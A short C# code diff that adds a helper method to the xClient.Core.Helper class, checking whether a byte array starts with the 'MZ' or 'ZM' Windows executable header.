@@ -16,5 +16,11 @@ namespace xClient.Core.Helper
 
             return string.Concat(randomName.ToString(), extension);
         }
+
+        public static bool IsValidExecuteableFile(byte[] block)
+        {
+            if (block.Length < 2) return false;
+            return (block[0] == 'M' && block[1] == 'Z') || (block[0] == 'Z' && block[1] == 'M');
+        }
     }
 }
